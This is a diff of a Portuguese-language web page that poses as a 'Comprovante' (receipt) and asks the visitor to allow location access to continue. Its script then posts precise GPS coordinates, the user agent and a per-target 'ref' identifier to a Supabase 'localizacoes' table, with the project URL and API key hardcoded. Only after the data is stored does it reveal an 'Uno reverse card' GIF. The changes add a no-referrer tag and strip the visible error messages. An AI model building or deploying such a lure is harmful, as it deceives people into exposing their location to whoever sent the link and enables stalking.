@@ -1,133 +1,256 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Comprovante</title>
-<style>
-*{box-sizing:border-box}html,body{margin:0;padding:0;width:100%;min-height:100%}
-body{min-height:100vh;background:#f5f6f8;font-family:Arial,Helvetica,sans-serif;display:flex;align-items:center;justify-content:center;padding:20px}
-#telaComprovante,#telaCarta{width:100%;background:#fff;text-align:center;box-shadow:0 15px 40px rgba(0,0,0,.08)}
-#telaComprovante{max-width:665px;border-radius:30px;padding:70px 45px 55px}
-#telaComprovante h1{margin:0 0 30px;font-size:52px;line-height:1.1;color:#111827}
-.descricao{margin:0 0 55px;font-size:27px;line-height:1.4;color:#4b5563}
-#botaoLocalizacao{width:100%;border:0;border-radius:22px;padding:25px 20px;background:#111827;color:#fff;font-size:27px;font-weight:700;cursor:pointer}
-#botaoLocalizacao:disabled{opacity:.65;cursor:not-allowed}
-#mensagem{margin-top:28px;font-size:20px;line-height:1.5;color:#d32f2f;display:none}
-#telaCarta{display:none;max-width:600px;border-radius:24px;padding:30px 20px}
-#telaCarta h1{margin:0 0 25px;font-size:32px;line-height:1.2;color:#111827}
-.gif-container{width:100%;max-width:500px;margin:0 auto}
-@media(max-width:600px){body{padding:18px}#telaComprovante{padding:55px 30px 45px;border-radius:26px}#telaComprovante h1{font-size:42px}.descricao{font-size:22px;margin-bottom:42px}#botaoLocalizacao{font-size:22px;padding:22px 18px;border-radius:18px}#mensagem{font-size:18px}#telaCarta{padding:25px 15px;border-radius:22px}#telaCarta h1{font-size:30px}}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="referrer" content="no-referrer">
+  <title>Comprovante</title>
+
+  <style>
+    *{box-sizing:border-box}
+    html,body{margin:0;padding:0;width:100%;min-height:100%}
+    body{
+      min-height:100vh;
+      background:#f5f6f8;
+      font-family:Arial,Helvetica,sans-serif;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:20px
+    }
+    #telaComprovante,#telaCarta{
+      width:100%;
+      background:#fff;
+      text-align:center;
+      box-shadow:0 15px 40px rgba(0,0,0,.08)
+    }
+    #telaComprovante{
+      max-width:665px;
+      border-radius:30px;
+      padding:70px 45px 55px
+    }
+    #telaComprovante h1{
+      margin:0 0 30px;
+      font-size:52px;
+      line-height:1.1;
+      color:#111827
+    }
+    .descricao{
+      margin:0 0 55px;
+      font-size:27px;
+      line-height:1.4;
+      color:#4b5563
+    }
+    #botaoLocalizacao{
+      width:100%;
+      border:0;
+      border-radius:22px;
+      padding:25px 20px;
+      background:#111827;
+      color:#fff;
+      font-size:27px;
+      font-weight:700;
+      cursor:pointer
+    }
+    #botaoLocalizacao:disabled{
+      opacity:.65;
+      cursor:not-allowed
+    }
+    #telaCarta{
+      display:none;
+      max-width:600px;
+      border-radius:24px;
+      padding:30px 20px
+    }
+    #telaCarta h1{
+      margin:0 0 25px;
+      font-size:32px;
+      line-height:1.2;
+      color:#111827
+    }
+    .gif-container{
+      width:100%;
+      max-width:500px;
+      margin:0 auto
+    }
+    @media(max-width:600px){
+      body{padding:18px}
+      #telaComprovante{
+        padding:55px 30px 45px;
+        border-radius:26px
+      }
+      #telaComprovante h1{font-size:42px}
+      .descricao{
+        font-size:22px;
+        margin-bottom:42px
+      }
+      #botaoLocalizacao{
+        font-size:22px;
+        padding:22px 18px;
+        border-radius:18px
+      }
+      #telaCarta{
+        padding:25px 15px;
+        border-radius:22px
+      }
+      #telaCarta h1{font-size:30px}
+    }
+  </style>
 </head>
+
 <body>
-<main id="telaComprovante">
-<h1>Comprovante</h1>
-<p class="descricao">Permitir localização para continuar.</p>
-<button id="botaoLocalizacao" type="button">Permitir Localização</button>
-<div id="mensagem"></div>
-</main>
 
-<main id="telaCarta">
-<h1>Carta Reverse do Uno</h1>
-<div class="gif-container">
-<div class="tenor-gif-embed" data-postid="11394353076404622319" data-share-method="host" data-aspect-ratio="0.678715" data-width="100%">
-<a href="https://tenor.com/view/metal-slug---thank-you-gif-11394353076404622319">Metal Slug - Thank You Sticker</a>
-from
-<a href="https://tenor.com/search/metal+slug+-+thank+you-stickers">Metal Slug - Thank You Stickers</a>
-</div>
-</div>
-</main>
+  <main id="telaComprovante">
+    <h1>Comprovante</h1>
+    <p class="descricao">Permitir localização para continuar.</p>
+    <button id="botaoLocalizacao" type="button">Permitir Localização</button>
+  </main>
 
-<script type="text/javascript" async src="https://tenor.com/embed.js"></script>
-<script>
-const SUPABASE_URL="https://gotszlmzwkhyymtpnkwp.supabase.co";
-const SUPABASE_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdvdHN6bG16dHBua3dwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg5NTQ3NjYsImV4cCI6MjEwNDUzMDc2Nn0.HjF8uEBmPw-4rcLf8ZajIit1lhekrhNIvkXbjWEtftg";
-const botao=document.getElementById("botaoLocalizacao");
-const mensagem=document.getElementById("mensagem");
-const telaComprovante=document.getElementById("telaComprovante");
-const telaCarta=document.getElementById("telaCarta");
-const parametros=new URLSearchParams(window.location.search);
-const referencia=parametros.get("ref")||null;
+  <main id="telaCarta">
+    <h1>Carta Reverse do Uno</h1>
 
-function mostrarErro(texto){mensagem.textContent=texto;mensagem.style.display="block"}
+    <div class="gif-container">
+      <div
+        class="tenor-gif-embed"
+        data-postid="11394353076404622319"
+        data-share-method="host"
+        data-aspect-ratio="0.678715"
+        data-width="100%">
+        <a href="https://tenor.com/view/metal-slug---thank-you-gif-11394353076404622319">
+          Metal Slug - Thank You Sticker
+        </a>
+        from
+        <a href="https://tenor.com/search/metal+slug+-+thank+you-stickers">
+          Metal Slug - Thank You Stickers
+        </a>
+      </div>
+    </div>
+  </main>
 
-function tratarErroLocalizacao(erro){
-console.error("Erro de localização:",erro);
-botao.disabled=false;
-botao.textContent="Permitir Localização";
-if(erro.code===1){mostrarErro("O Safari negou o acesso à localização. Verifique a permissão do site.");return}
-if(erro.code===2){mostrarErro("Não foi possível determinar sua localização. Verifique o GPS e tente novamente.");return}
-if(erro.code===3){mostrarErro("A localização demorou muito para responder. Tente novamente.");return}
-mostrarErro("Não foi possível obter sua localização. Tente novamente.")
-}
+  <script async src="https://tenor.com/embed.js"></script>
 
-function mostrarCarta(){
-telaComprovante.style.display="none";
-telaCarta.style.display="block";
-window.scrollTo(0,0);
-}
+  <script>
+    const SUPABASE_URL = "https://gotszlmzwkhyymtpnkwp.supabase.co";
 
-async function enviarLocalizacao(posicao){
-const dados={
-referencia:referencia,
-latitude:posicao.coords.latitude,
-longitude:posicao.coords.longitude,
-precisao_metros:posicao.coords.accuracy||null,
-user_agent:navigator.userAgent,
-ip_address:null,
-capturado_em:new Date().toISOString()
-};
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdvdHN6bG16d2toeXltdHBua3dwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg5NTQ3NjYsImV4cCI6MjEwNDUzMDc2Nn0.HjF8uEBmPw-4rcLf8ZajIit1lhekrhNIvkXbjWEtftg";
 
-try{
-const resposta=await fetch(SUPABASE_URL+"/rest/v1/localizacoes",{
-method:"POST",
-headers:{
-"Content-Type":"application/json",
-"apikey":SUPABASE_KEY,
-"Authorization":"Bearer "+SUPABASE_KEY,
-"Prefer":"return=minimal"
-},
-body:JSON.stringify(dados)
-});
-const corpo=await resposta.text();
-console.log("Status Supabase:",resposta.status);
-console.log("Resposta Supabase:",corpo);
+    const botao = document.getElementById("botaoLocalizacao");
+    const telaComprovante = document.getElementById("telaComprovante");
+    const telaCarta = document.getElementById("telaCarta");
 
-if(!resposta.ok){
-botao.disabled=false;
-botao.textContent="Permitir Localização";
-mostrarErro("Não foi possível confirmar a localização. Tente novamente.");
-return;
-}
-mostrarCarta();
-}catch(erro){
-console.error("Erro de conexão:",erro);
-botao.disabled=false;
-botao.textContent="Permitir Localização";
-mostrarErro("Não foi possível registrar a localização. Verifique sua conexão e tente novamente.");
-}
-}
+    const parametros = new URLSearchParams(window.location.search);
+    const referencia = parametros.get("ref") || null;
 
-function solicitarLocalizacao(){
-mensagem.style.display="none";
-if(!window.isSecureContext){mostrarErro("A conexão segura é necessária para acessar a localização.");return}
-if(!navigator.geolocation){mostrarErro("Este navegador não oferece suporte à localização.");return}
+    function mostrarCarta(){
+      telaComprovante.style.display = "none";
+      telaCarta.style.display = "block";
+      window.scrollTo(0, 0);
+    }
 
-botao.disabled=true;
-botao.textContent="Obtendo localização...";
+    function restaurarBotao(){
+      botao.disabled = false;
+      botao.textContent = "Permitir Localização";
+    }
 
-navigator.geolocation.getCurrentPosition(
-function(posicao){
-botao.textContent="Confirmando...";
-enviarLocalizacao(posicao);
-},
-function(erro){tratarErroLocalizacao(erro)},
-{enableHighAccuracy:true,timeout:30000,maximumAge:0}
-);
-}
+    function enviarLocalizacao(posicao){
 
-botao.addEventListener("click",solicitarLocalizacao);
-</script>
+      const coords = posicao.coords;
+
+      const dados = {
+        referencia: referencia,
+        latitude: Number(coords.latitude),
+        longitude: Number(coords.longitude),
+        precisao_metros: Number.isFinite(coords.accuracy)
+          ? Number(coords.accuracy)
+          : null,
+        user_agent: navigator.userAgent,
+        ip_address: null,
+        capturado_em: new Date().toISOString()
+      };
+
+      return fetch(
+        SUPABASE_URL + "/rest/v1/localizacoes",
+        {
+          method: "POST",
+          mode: "cors",
+          cache: "no-store",
+          credentials: "omit",
+          keepalive: true,
+
+          headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json",
+            "apikey": SUPABASE_KEY,
+            "Authorization": "Bearer " + SUPABASE_KEY,
+            "Prefer": "return=minimal"
+          },
+
+          body: JSON.stringify(dados)
+        }
+      ).then(function(resposta){
+
+        if (!resposta.ok) {
+          throw new Error(
+            "Supabase HTTP " + resposta.status
+          );
+        }
+
+        return true;
+      });
+    }
+
+    function erroLocalizacao(erro){
+      console.error("Geolocation error:", erro);
+      restaurarBotao();
+    }
+
+    function erroEnvio(erro){
+      console.error("Supabase insert error:", erro);
+      restaurarBotao();
+    }
+
+    function solicitarLocalizacao(){
+
+      if (!window.isSecureContext || !navigator.geolocation) {
+        restaurarBotao();
+        return;
+      }
+
+      botao.disabled = true;
+      botao.textContent = "Obtendo localização...";
+
+      navigator.geolocation.getCurrentPosition(
+
+        function(posicao){
+
+          botao.textContent = "Confirmando...";
+
+          enviarLocalizacao(posicao)
+            .then(function(){
+
+              // Só mostra a segunda tela depois
+              // que o INSERT for aceito pelo Supabase.
+              mostrarCarta();
+
+            })
+            .catch(erroEnvio);
+        },
+
+        erroLocalizacao,
+
+        {
+          enableHighAccuracy: true,
+          timeout: 30000,
+          maximumAge: 0
+        }
+      );
+    }
+
+    botao.addEventListener(
+      "click",
+      solicitarLocalizacao
+    );
+  </script>
+
 </body>
 </html>
